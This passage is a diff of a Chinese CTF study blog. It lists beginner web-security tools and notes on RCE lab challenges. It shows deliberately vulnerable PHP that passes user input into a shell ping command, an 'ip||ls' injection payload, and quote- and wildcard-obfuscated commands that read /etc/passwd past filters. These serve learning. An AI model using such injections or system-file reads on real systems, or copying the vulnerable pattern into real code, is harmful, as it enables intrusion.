@@ -1,302 +1,970 @@
-<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content=" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\n"><title>从零开始的CTF探险！</title><link rel=canonical href=https://Oight.github.io/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/><link rel=stylesheet href=/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css><meta property='og:title' content="从零开始的CTF探险！"><meta property='og:description' content=" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\n"><meta property='og:url' content='https://Oight.github.io/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/'><meta property='og:site_name' content='Oight'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-06-01T00:00:00+00:00'><meta property='article:modified_time' content='2025-06-01T00:00:00+00:00'><meta name=twitter:title content="从零开始的CTF探险！"><meta name=twitter:description content=" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\n"><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
-<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_37edead8cd3c258e.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
-</a><span class=emoji>🐧</span></figure><div class=site-meta><h1 class=site-name><a href=/>Oight</a></h1><h2 class=site-description>Talk is cheap. Show me the code.</h2></div></header><ol class=menu-social><li><a href=https://space.bilibili.com/696224138 target=_blank title=bilibili rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 014-4h10a4 4 0 014 4v6a4 4 0 01-4 4H7a4 4 0 01-4-4v-6z"/><path d="M8 3l2 3"/><path d="M16 3l-2 3"/><path d="M9 13v-2"/><path d="M15 11v2"/></svg></a></li><li><a href=https://github.com/Oight target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
-<span>主页</span></a></li><li><a href=/%E5%85%B3%E4%BA%8E/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
-<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
-<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
-<span>Search</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
-<span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#一web学习目录>一、WEB学习目录</a><ol><li><a href=#工具篇>工具篇：</a></li><li><a href=#web包括哪些内容>WEB包括哪些内容：</a></li><li><a href=#ctf-show>CTF show</a><ol><li><a href=#web签到题>web签到题</a></li><li><a href=#rce-labs-level4>RCE-labs-level4</a></li><li><a href=#rce-labs-level5>RCE-labs-level5</a></li><li><a href=#rce-labs-level6>RCE-labs-level6</a></li><li><a href=#rce-labs-level7>RCE-labs-level7</a></li><li><a href=#rce-labs-level2>RCE-labs-level2</a></li><li><a href=#rce-labs-level9>RCE-labs-level9</a></li><li><a href=#rce-labs-level10>RCE-labs-level10</a></li><li><a href=#青岑web入门basic_14>青岑/web入门/basic_14</a></li><li><a href=#青岑web入门ezphp_2>青岑/web入门/ezphp_2</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#2a9d8f;color:#fff>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/>从零开始的CTF探险！</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published>2025-06-01</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 10 分钟</time></div></footer></div></header><section class=article-content><blockquote><h1 id=以此文记录我在学习ctf中的心路历程日拱一卒功不唐捐>以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。</h1><h2 id=一web学习目录>一、WEB学习目录</h2><h3 id=工具篇>工具篇：</h3><p>WEB的常用工具有：
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\n">
+<title>从零开始的CTF探险！</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="从零开始的CTF探险！">
+<meta property='og:description' content=" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\n">
+<meta property='og:url' content='https://Oight.github.io/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-06-01T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="从零开始的CTF探险！">
+<meta name="twitter:description" content=" 以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。\r一、WEB学习目录\r工具篇：\rWEB的常用工具有： BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器） Hackerbar（浏览器插件，传参的好帮手） 蚁剑（连接工具） 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（） ### 拥有了入门的工具，就可以步入WEB的世界力（喜）\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🐧</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">Talk is cheap. Show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#一web学习目录">一、WEB学习目录</a>
+      <ol>
+        <li><a href="#工具篇">工具篇：</a></li>
+        <li><a href="#web包括哪些内容">WEB包括哪些内容：</a></li>
+        <li><a href="#ctf-show">CTF show</a>
+          <ol>
+            <li><a href="#web签到题">web签到题</a></li>
+            <li><a href="#rce-labs-level4">RCE-labs-level4</a></li>
+            <li><a href="#rce-labs-level5">RCE-labs-level5</a></li>
+            <li><a href="#rce-labs-level6">RCE-labs-level6</a></li>
+            <li><a href="#rce-labs-level7">RCE-labs-level7</a></li>
+            <li><a href="#rce-labs-level2">RCE-labs-level2</a></li>
+            <li><a href="#rce-labs-level9">RCE-labs-level9</a></li>
+            <li><a href="#rce-labs-level10">RCE-labs-level10</a></li>
+            <li><a href="#青岑web入门basic_14">青岑/web入门/basic_14</a></li>
+            <li><a href="#青岑web入门ezphp_2">青岑/web入门/ezphp_2</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #2a9d8f; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84ctf%E6%8E%A2%E9%99%A9/">从零开始的CTF探险！</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-06-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <blockquote>
+<h1 id="以此文记录我在学习ctf中的心路历程日拱一卒功不唐捐">以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。
+</h1><h2 id="一web学习目录">一、WEB学习目录
+</h2><h3 id="工具篇">工具篇：
+</h3><p>WEB的常用工具有：
 BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器）
 Hackerbar（浏览器插件，传参的好帮手）
 蚁剑（连接工具）
 还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（）
 ###
-拥有了入门的工具，就可以步入WEB的世界力（喜）</p><h3 id=web包括哪些内容>WEB包括哪些内容：</h3><p>1.文件包含
-2.文件上传</p></blockquote><blockquote><p>[!NOTE]</p><p>更新：2026年3月8日</p></blockquote><p>慢慢意识到自己当初基础非常的薄弱，以前也没怎么好好刷题</p><p>这个博客用来记录从零开始学web的做题记录</p><h3 id=ctf-show>CTF show</h3><h4 id=web签到题>web签到题</h4><p>F12 查看前端，在HTML中看到base64加密的flag</p><h4 id=rce-labs-level4>RCE-labs-level4</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
-</span></span><span class=line><span class=cl><span class=cm>/*
-</span></span></span><span class=line><span class=cl><span class=cm>&amp;&amp;（逻辑与运算符）: 只有当第一个命令 cmd_1 执行成功（返回值为 0）时，才会执行第二个命令 cmd_2。例:  mkdir test &amp;&amp; cd test
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>||（逻辑或运算符）: 只有当第一个命令 cmd_1 执行失败（返回值不为 0）时，才会执行第二个命令 cmd_2。例:  cd nonexistent_directory || echo &#34;Directory not found&#34;
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>&amp;（后台运行符）: 将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行。例:  sleep 10 &amp; echo &#34;This will run immediately.&#34;
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>;（命令分隔符）: 无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2。例:  echo &#34;Hello&#34; ; echo &#34;World&#34;
-</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>hello_server</span><span class=p>(</span><span class=nv>$ip</span><span class=p>){</span>
-</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;ping -c 1 </span><span class=si>$ip</span><span class=s2>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ip&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>hello_server</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ip&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>null</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
-</span></span></span></code></pre></div><p>在这道题中，默认只有传递 ip||ls 可以成功执行，原因是 Payload在到达服务器并最终执行的过程中，经过了HTTP 解析层 和 Linux Shell 逻辑层 的双重处理，在 URL 中，& 符号有着特殊含义，它是不同 GET 参数之间的分隔符，所以在传递的时候必须将&进行URL编码才能执行成功，；同理。</p><h4 id=rce-labs-level5>RCE-labs-level5</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span>
-</span></span><span class=line><span class=cl><span class=cm>/*
-</span></span></span><span class=line><span class=cl><span class=cm>在Shell中，单/双引号 &#34;/&#39; 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。
-</span></span></span><span class=line><span class=cl><span class=cm>例如：echo &#34;$&#34;a 会输出 $a，而 echo $a 会输出变量a的值，当只有&#34;&#34;则表示空字符串，Shell会忽略它。
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>*（星号）: 匹配零个或多个字符。例子: *.txt。
-</span></span></span><span class=line><span class=cl><span class=cm>?（问号）: 匹配单个字符。例子: file?.txt。
-</span></span></span><span class=line><span class=cl><span class=cm>[]（方括号）: 匹配方括号内的任意一个字符。例子: file[1-3].txt。
-</span></span></span><span class=line><span class=cl><span class=cm>[^]（取反方括号）: 匹配不在方括号内的字符。例子: file[^a-c].txt。
-</span></span></span><span class=line><span class=cl><span class=cm>{}（大括号）: 匹配大括号内的任意一个字符串。例子: file{1,2,3}.txt。
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>通过组合上述技巧，我们可以用于绕过CTF中一些简单的过滤：
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>system(&#34;c&#39;&#39;at /e&#39;t&#39;c/pass?d&#34;);
-</span></span></span><span class=line><span class=cl><span class=cm>system(&#34;/???/?at /e&#39;t&#39;c/pass?d&#34;);
-</span></span></span><span class=line><span class=cl><span class=cm>system(&#34;/???/?at /e&#39;t&#39;c/*ss*&#34;);
-</span></span></span><span class=line><span class=cl><span class=cm>...
-</span></span></span><span class=line><span class=cl><span class=cm>
-</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
